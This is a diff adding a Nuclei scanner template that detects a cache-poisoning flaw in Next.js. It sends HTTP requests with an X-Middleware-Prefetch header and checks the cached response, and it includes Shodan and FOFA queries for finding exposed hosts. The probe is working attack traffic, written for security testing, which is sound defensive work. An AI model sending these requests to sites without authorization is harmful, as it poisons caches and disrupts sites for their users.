@@ -1,0 +1,51 @@
+id: nextjs-middleware-cache
+
+info:
+  name: Next.js - Cache Poisoning
+  author: DhiyaneshDk
+  severity: high
+  description: |
+     Next.js is vulnerable to Cache Poisoning using X-Middleware-Prefetch.
+  reference:
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: nextjs,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Middleware-Prefetch: 1
+        Priority: u=1
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Middleware-Prefetch: 1
+        Priority: u=1
+
+      - |
+        @timeout: 10s
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(all_headers_2, 'X-Middleware-Skip: 1')"
+          - "status_code_3 == 200 && contains(all_headers_3, 'X-Middleware-Skip: 1')"
+        condition: and
+# digest: 4a0a0047304502210080b9adcba52287c224057e3bbcdbee3f3155cbf51b3f16918a719b0fdb26980702205b83c25e28c30ecaed66a529ed1f050882e82bfad9f94dbf668b60a8029c25fd:922c64590222798bb761d5b6d8e72950
